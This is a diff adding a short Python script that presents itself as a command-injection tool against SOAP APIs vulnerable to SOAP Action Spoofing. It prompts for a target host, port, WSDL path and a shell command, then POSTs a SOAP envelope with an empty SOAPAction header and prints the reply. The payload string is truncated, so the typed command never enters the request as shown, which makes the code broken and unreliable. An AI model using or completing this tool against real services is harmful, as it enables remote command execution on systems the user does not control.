@@ -1,0 +1,17 @@
+# This is a tool created by P4int P4rr0t for abusing command injection with SOAP api's
+# You need to know the path of the WSDL file and the target host needs to be vulnerable to SOAP Action Spoofing
+
+import requests
+
+while True:
+    target_host = input("Enter the target host: ")
+    target_port = input("Enter the target port: ")
+    path_to_wsdl_file = input("Enter the path to the WSDL file: ")
+
+    cmd = input("$ ")
+    payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/en...'
+    headers = {"SOAPAction": ""}
+
+    response = requests.post(f"http://{target_host}:{target_port}/{path_to_wsdl_file}", data=payload, headers=headers)
+
+    print(response.text)
